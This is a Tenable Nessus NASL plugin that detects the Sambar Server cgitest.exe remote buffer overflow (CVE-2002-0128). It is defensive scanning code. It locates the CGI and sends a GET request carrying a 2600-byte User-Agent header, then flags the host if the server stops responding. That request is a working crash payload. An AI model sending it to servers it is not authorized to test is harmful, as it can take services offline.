#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10040);
 script_version("$Revision: 1.42 $");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");

 script_cve_id("CVE-2002-0128");
 script_bugtraq_id(3885);
 script_osvdb_id(34, 55369, 55370);

 script_name(english:"Sambar Server cgitest.exe Remote Overflow");
 script_summary(english:"Checks for the /cgi-bin/cgitest.exe buffer overrun");

 script_set_attribute(attribute:"synopsis", value:
"The web application installed on the remote host has a buffer overflow
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote host is running a vulnerable version of Sambar Server, a
web server and web proxy.

There is a remote buffer overflow vulnerability in 'cgitest.exe'. A
remote attacker could use this to crash the web server, or potentially
execute arbitrary code.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Jan/188");
 script_set_attribute(attribute:"solution", value:"Remove the affected file from /cgi-bin.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2002/01/16");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/11/18");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(1, "The web server on port "+port+" is dead.");

flag = 0;
directory = "";

foreach dir (cgi_dirs())
{
 if (is_cgi_installed3(item:string(dir, "/cgitest.exe"), port:port, exit_on_fail: 1))
 {
  flag = 1;
  directory = dir;
  break;
 }
}

if(!flag)exit(0, "cgitest.exe was not found on port "+port+".");
data = string(directory, "/cgitest.exe");
user_agent = make_array("User-Agent", crap(2600));
r = http_send_recv3(method:"GET", item:data, port:port, add_headers:user_agent, exit_on_fail: 0);
if (isnull(r)) security_hole(port);

